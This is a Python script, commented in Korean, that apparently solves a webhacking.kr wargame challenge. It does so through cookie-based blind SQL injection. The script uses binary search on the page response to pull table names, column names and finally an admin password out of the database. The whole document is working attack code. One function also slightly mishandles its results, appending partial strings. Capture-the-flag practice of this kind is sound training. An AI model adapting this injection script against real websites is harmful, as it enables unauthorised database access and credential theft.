import urllib, urllib.request, re

#phpsessid에는 본인의 쿠키에 있는 값을 입력
phpsessid = ""
cookie = "time=({} limit {}, 1)>{};PHPSESSID="+ phpsessid

#inject 함수는 쿼리문을 수행한 결과를 True, False로 반환
def inject(params):
	url = "https://webhacking.kr/challenge/web-02/"
	req = urllib.request.Request(url)
	req.add_header("Cookie", cookie.format(*params))
	res = urllib.request.urlopen(req)
	read = res.read().decode("utf-8")
	return "2070-01-01 09:00:01" in read

#DB 값을 알아내기 위해 Binary Search를 활용
def binary_search(left, right, params):
	if left == right:
		return left

	mid = (left + right) // 2

	if inject(params+(mid,)):
		return binary_search(mid+1, right, params)
	else:
		return binary_search(left, mid, params)

#DB에 있는 데이터의 수를 알아내는 함수
def find_count(name, col, table):
	query = 'select count({}) from {}'.format(col, table)
	count = binary_search(0, 100, (query, 0))
	print(f"{name}: {count}")
	return count

#DB에 있는 데이터의 길이를 알아내기 위한 함수 
def find_length(name, col, table, rows):
	lengths = []
	query = 'select length({}) from {}'.format(col, table)
	for row in range(rows):
		length = binary_search(0, 100, (query, row))
		lengths.append(length)
		print(f"{name}[{row}]: {length}")
	return lengths

#DB에 있는 데이터의 내용을 알아내기 위한 함수
def find_word(name, col, table, rows, length):
	words = []
	query = "select ascii(substring({}, {}, 1)) from {}"
	for row in range(rows):
		word = ""
		for idx in range(1, length[row]+1):
			word += chr(binary_search(32, 127, (query.format(col, idx, table), row)))
			words.append(word)
			print(f"{name}[{row}]: {word}")
	return words

#데이터의 개수, 길이를 알아내고 최종적으로 DB에 있는 내용을 알아내도록 묶어놓은 함수
def find(name, col, table):
	count = find_count("count_"+name, col, table)
	length = find_length("length_"+name, col, table, count)
	word = find_word(name, col, table, count, length)
	return word


if __name__ == "__main__":
	find("tables", "table_name", "information_schema.tables where table_schema=database()") #현재 선택된 DB의 테이블을 탐색
	find("cols", "column_name", "information_schema.columns where table_name='admin_area_pw'") #위 함수로 알아낸 admin_area_pw 테이블의 칼럼을 탐색
	find("password", "pw", "admin_area_pw") #위 함수로 알아낸 pw 칼럼의 값을 탐색